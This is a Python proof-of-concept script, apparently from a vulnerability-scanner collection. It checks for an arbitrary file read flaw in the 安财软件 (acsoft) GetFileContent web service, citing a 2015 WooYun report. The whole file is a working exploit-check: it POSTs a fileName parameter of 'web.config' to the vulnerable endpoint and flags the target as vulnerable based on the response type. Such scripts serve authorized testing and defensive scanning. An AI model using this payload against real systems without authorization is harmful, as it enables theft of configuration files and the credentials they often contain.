﻿#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 安财软件GetFileContent任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2015-0121651
author: Lucifer
description: 文件/WS/WebService.asmx/GetFileContent中,参数fileName存在任意文件读取。
'''
import sys
import json
import requests
import warnings
sys.path.append('../../')
from color import *

class acsoft_GetFileContent_fileread:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {
            "Content":"1",
            "fileName":"web.config"
        }
        payload = "/WS/WebService.asmx/GetFileContent"
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                printGreen("[+]Success:存在安财软件GetFileContent任意文件读取漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4))
            else:
                printBlue("[-]Info:不存在acsoft_GetFileContent_fileread漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = acsoft_GetFileContent_fileread(sys.argv[1])
    testVuln.run()